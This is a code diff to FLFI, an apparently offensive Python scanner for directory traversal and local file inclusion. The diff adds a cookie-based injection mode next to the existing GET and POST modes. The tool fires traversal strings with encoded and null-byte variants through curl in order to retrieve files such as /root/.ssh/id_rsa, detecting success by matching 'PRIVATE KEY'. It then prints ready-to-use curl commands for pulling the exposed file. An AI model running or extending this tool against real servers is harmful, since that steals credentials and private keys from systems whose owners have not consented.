@@ -43,11 +43,17 @@ parser.add_argument('-d', '--param-data', dest="param_data", required=False, typ
 parser.add_argument('-c', '--check', dest="check_str", required=False, type=str, \
     help="A unique string to help identify success.")
 
+parser.add_argument('-C', '--cookie-only', dest="use_cookie_only", required=False, action='store_true', \
+    help="USE ONLY COOKIE METHOD to attempt to use directory traversal, must supply the target cookie with -d or --params-data.")
+
+parser.add_argument('--cookie-include', dest="use_cookie", required=False, action='store_true', \
+    help="INCLUDE COOKIE METHOD to attempt to use directory traversal, must supply the target cookie with -d or --params-data.")
+
 parser.add_argument('--folder', dest="folder", required=False, type=str, \
     help="Add a fold prefix to the traversal.")
 
-parser.add_argument('-A', dest="all_dts", required=False, action='store_true',
-    help="Adds uncommon traversal strings.")
+parser.add_argument('-A', dest="all_methods", required=False, action='store_true',
+    help="Adds uncommon traversal strings and all methods.")
 
 parser.add_argument('-P', '--post-only', dest="use_post_only", required=False, action='store_true', \
     help="Chagne HTTP method to ONLY POST (Default is GET)")
@@ -100,19 +106,11 @@ class FLFI:
                 "name": "/root/.ssh/id_rsa",
                 "checks": ["PRIVATE KEY"],
             }]
-        
-        # Common Directory Traversal strings:
-        self.dts=['../', '....//',]
-        # Common and UNCOMMON strings:
-        if args.all_dts:
-            self.dts=['../', '....//','.%2e/','.%%32%65/']
-
-        # Nullbyte strings:
-        self.nbyte = ['','/.','%00']
 
         # Set VARs from argparse
         self.url = args.url
         self.param_data = args.param_data
+        self.use_all = args.all_methods
         self.folder = args.folder
         self.singular_search_file = args.search_file
         self.singular_search_check = args.check_str
@@ -130,10 +128,23 @@ class FLFI:
         
         if args.use_post_only:
             self.http_methods = ['POST']
-        if args.use_post:
+        if args.use_post or args.all_methods:
             self.http_methods.append['POST']
+        if args.use_cookie_only:
+            self.http_methods = ['COOKIE']
+        if args.use_cookie or args.all_methods:
+            self.http_methods.append['COOKIE']
         if args.folder:
             self.folders_to_check = [ args.folder + '/' ]
+
+        # Common Directory Traversal strings:
+        self.dts=['../', '....//',]
+        # Common and UNCOMMON strings:
+        if args.all_methods:
+            self.dts=['../', '....//','.%2e/','.%%32%65/']
+
+        # Nullbyte strings:
+        self.nbyte = ['','/.','%00']
         
         # VARs for Current State
         self.curr_url = ""
@@ -198,7 +209,7 @@ class FLFI:
         url = (self.url + param + '/' + self.curr_folder).replace('//','/') + (self.curr_trav_str * self.curr_interation) + \
             self.curr_file[1:] + self.curr_null_byte
         self.prev_len = self.curr_len
-        self.curr_len = len(url)
+        self.curr_len = len(url + (" " * 25))
         return url
 
     def construct_url_post(self):
@@ -209,11 +220,11 @@ class FLFI:
         url = (self.url + '/' + self.curr_folder).replace('//','/') 
         self.curr_post_param = self.param_data + "=" + (self.curr_trav_str * self.curr_interation) + self.curr_file + self.curr_null_byte
         self.prev_len = self.curr_len
-        self.curr_len = len(url + self.curr_post_param + (" " *20))
+        self.curr_len = len(url + self.curr_post_param + (" " * 50))
         return url
     
     def dir_trav_curl(self, f):
-        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL <---\n") 
+        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL WITH GET METHOD <---\n") 
         self.curr_http_method = "GET"
         for folder in self.folders_to_check:
             for i in range(self.max_depth + 1):
@@ -235,13 +246,13 @@ class FLFI:
                             r=subprocess.getoutput("curl " + self.curr_url)
                         for check in f['checks']:
                             if check in r:
-                                print(" " * (self.prev_len + 25), end='\r', flush=True)                  
+                                print(" " * self.prev_len, end='\r', flush=True)                  
                                 return "Woot!"
-        print("DONE" + (" " * (self.prev_len + 20)))
+        print("DONE" + (" " * self.prev_len))
         return 'I got nothing'
 
     def dir_trav_curl_post(self, f):
-        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL USING POST METHOD <---\n") 
+        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL WITH POST METHOD <---\n") 
         self.curr_http_method = "POST"
         for folder in self.folders_to_check:
             for i in range(self.max_depth + 1):
@@ -263,9 +274,37 @@ class FLFI:
                             r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url) 
                         for check in f['checks']:
                             if check in r:
-                                print(" " * (self.prev_len + 25), end='\r', flush=True)                  
+                                print((" " * self.prev_len), end='\r', flush=True)                  
                                 return "Woot!"
-        print("DONE" + (" " * (self.prev_len + 20)))
+        print("DONE" + (" " * self.prev_len))
+        return 'I got nothing'
+
+    def dir_trav_curl_cookie(self, f):
+        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL WITH COOKIE METHOD <---\n") 
+        self.curr_http_method = "COOKIE"
+        for folder in self.folders_to_check:
+            for i in range(self.max_depth + 1):
+                for sym in self.dts:
+                    for nb in self.nbyte:
+                        self.curr_folder = folder
+                        self.curr_null_byte
+                        self.curr_interation = i
+                        self.curr_trav_str = sym
+                        self.curr_null_byte = nb
+                        self.curr_file = f['name']
+                        self.curr_url = self.construct_url_post()
+                        print(" " * self.prev_len, end='\r', flush=True)
+                        if i == 0:
+                            print('[-] TRYING: curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -', end='\r', flush=True)
+                            r=subprocess.getoutput('curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -')           
+                        else:
+                            print('[-] TRYING: curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -', end='\r', flush=True)
+                            r=subprocess.getoutput('curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -') 
+                        for check in f['checks']:
+                            if check in r:
+                                print((" " * self.prev_len) , end='\r', flush=True)                  
+                                return "Woot!"
+        print("DONE" + (" " * self.prev_len))
         return 'I got nothing'
     
     def check_all_files_curl(self):
@@ -275,9 +314,10 @@ class FLFI:
             r=subprocess.getoutput("curl -s " + self.curr_url)
             for check in f['checks']:
                 if check in r:
-                    print("----------------------------------------------------------------------------------")
-                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url)
-                    print("----------------------------------------------------------------------------------\n")
+                    print("--------------------------------------------------------------------------------------------")
+                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + "\n")
+                    print("[+] USE 'curl -s " + self.curr_url + "' to get file directly.")
+                    print("--------------------------------------------------------------------------------------------\n")
                     if self.print_file:
                         print(r)
                     break
@@ -290,9 +330,26 @@ class FLFI:
             r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url)
             for check in f['checks']:
                 if check in r:
-                    print("----------------------------------------------------------------------------------")
-                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + " with POST " + self.curr_post_param)
-                    print("----------------------------------------------------------------------------------\n")
+                    print("--------------------------------------------------------------------------------------------")
+                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + " with POST " + self.curr_post_param + "\n")
+                    print('[+] USE curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url)
+                    print("--------------------------------------------------------------------------------------------\n")
+                    if self.print_file:
+                        print(r)
+                    break
+        quit()
+    
+    def check_all_files_curl_cookie(self):
+        for f in self.common_files:
+            self.curr_file = f['name']
+            self.curr_url  = self.construct_url_post()
+            r=subprocess.getoutput('curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -')
+            for check in f['checks']:
+                if check in r:
+                    print("--------------------------------------------------------------------------------------------")
+                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + " with POST " + self.curr_post_param + "\n")
+                    print('[+] USE curl -s ' + self.curr_url + ' --cookie "' + self.curr_post_param + '" --output -')
+                    print("--------------------------------------------------------------------------------------------\n")
                     if self.print_file:
                         print(r)
                     break
@@ -310,3 +367,8 @@ for f in lfi.common_files:
         answer = lfi.dir_trav_curl_post(f)
         if answer != "I got nothing":
             lfi.check_all_files_curl_post()
+    if 'COOKIE' in lfi.http_methods:
+        answer = lfi.dir_trav_curl_cookie(f)
+        if answer != "I got nothing":
+            lfi.check_all_files_curl_cookie()
+    
